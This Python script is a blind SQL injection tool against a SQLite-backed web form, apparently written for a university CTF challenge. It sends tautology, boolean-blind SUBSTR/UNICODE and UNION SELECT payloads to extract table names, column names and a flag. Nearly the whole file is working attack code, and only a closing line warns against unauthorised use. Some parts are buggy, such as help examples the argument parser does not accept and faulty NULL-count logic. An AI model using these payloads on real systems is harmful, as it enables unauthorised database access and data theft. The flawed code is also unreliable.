'''
Author: 0x4F776C
GitHub: https://github.com/0x4F776C/Structured-Query-Language/tree/main/scripts/SQLite

Note: perform a "pip install -r requirements.txt" to install all required imports before executing script
'''

import argparse
import textwrap
import requests
import re

url = 'http://127.0.0.1:8889/'
#url = 'http://cs2107-ctfd-i.comp.nus.edu.sg:8083/'
post_form = 'catbreed'
headers = {
        'referrer': url + post_form,
        'Connection': 'keep-alive',
        'Host': url
}
success_regex = 'Cat breed exists!'

def testSqli():
    print('[*] Start...')

    data = {
        'breed': "' OR 1=1 --"
    }

    response = requests.post(url + post_form, headers=headers, data=data)
    match = re.search(success_regex, response.text)

    print(match)
    print('[!] Completed!')

def getTableName():
    table_dirty = []
    table_clean = []

    print('[*] Start...')

    for offset in range(1, 14):
        for dec_number in range(32, 127):
            data = {
                # first column
                #'breed': "' OR UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table'), " + str(offset) + ", 1)) < " + str(dec_number) + " --"

                # second column
                'breed': "' OR UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1, 1), " + str(offset) + ", 1)) < " + str(dec_number) + " --"
            }

            response = requests.post(url + post_form, headers=headers, data=data)
            match = re.search(success_regex, response.text)

            if match:
                table_dirty.append(dec_number - 1)
                break

    for flag in table_dirty:
        table_clean.append(chr(flag))

    delimiter = ''
    print(delimiter.join(table_clean))
    print('[!] Completed!')

def getColumnsName(table_name):
    print('[*] Start...')

    column_dirty = []
    column_clean = []

    for offset in range(1, 7):
        for dec_number in range(32, 127):
            data = {
                # first column
                #'breed': "' OR UNICODE(SUBSTR((SELECT name FROM PRAGMA_TABLE_INFO('" + table_name + "')), " + str(offset) + ", 1)) < " + str(dec_number) + " --"

                # second column
                'breed': "' OR UNICODE(SUBSTR((SELECT name FROM PRAGMA_TABLE_INFO('" + table_name + "') LIMIT 1, 1), " + str(offset) + ", 1)) < " + str(dec_number) + " --"
            }

            response = requests.post(url + post_form, headers=headers, data=data)
            match = re.search(success_regex, response.text)

            if match:
                column_dirty.append(dec_number - 1)
                break

    for flag in column_dirty:
        column_clean.append(chr(flag))

    delimiter = ''
    print(delimiter.join(column_clean))
    print('[!] Completed!')

def getColumns(null_count, db_name):
    print('[*] Start...')

    for i in range(0, null_count):
        null = "NULL"
        if (i == 0):
            data = {
                "breed": "' UNION SELECT " + null + " FROM " + db_name + " WHERE type='table' --"
            }
        else:
            null += ", NULL"
            data = {
                "breed": "' UNION SELECT " + null * i + " FROM " + db_name + " WHERE type='table' --"
            }

        response = requests.post(url + post_form, headers=headers, data=data)
        match = re.search(success_regex, response.text)

        if (match):
            i = i + 1
            print(f"Number of columns in {db_name}: {i}")
            print('[!] Completed!')

def getFlag(table_name):
    print('[*] Start...')

    flag_dirty = []
    flag_clean = []

    for offset in range(1, 60):
        for dec_number in range(32, 127):
            data = {
                    'breed': "' OR UNICODE(SUBSTR((SELECT " + table_name[:-1] + " FROM " + table_name + "), " + str(offset) + ", 1)) < " + str(dec_number) + " --"
            }

            response = requests.post(url + post_form, headers=headers, data=data)
            match = re.search(success_regex, response.text)

            if match:
                flag_dirty.append(dec_number - 1)
                break

    for flag in flag_dirty:
        flag_clean.append(chr(flag))

    delimiter = ''
    print(delimiter.join(flag_clean))
    print('[!] Completed!')

def choice(option):
    if option == '1':
        testSqli()
    elif option == '2':
        getTableName()
    elif option == '3':
        table_name = input('Table name: ')
        getColumnsName(table_name=table_name)
    elif option == '4':
        null_count = input('Number of NULLs expected: ')
        db_name =  input('Database name: ')
        getColumns(null_count=int(null_count), db_name=db_name)
    elif option == '5':
        table_name = input('Table name: ')
        getFlag(table_name=table_name)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        prog='SQLinjector',
        description=textwrap.dedent('''
            SQLite SQL injection tool for pentesting/red-teaming/CTF challenge

            Example:
                python %(prog)s 4 4 sqlite_master
                python %(prog)s 5 flags

        '''),
        usage='use "python %(prog)s -h" for more information',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog='DO NOT USE AGAINST UNAUTHORISED SYSTEM(S)'
    )

    parser.add_argument(
        '--argument',
        help=textwrap.dedent('''
            1 - Vulnerability test (no argument needed)
            2 - Get table name (no argument needed)
            3 - Get column name (requires table_name)
            4 - Get number of columns (requires null_count, db_name)
            5 - Get flag (requires table_name)
        '''),
        required=True
        )

    args = parser.parse_args()

    choice(args.argument)
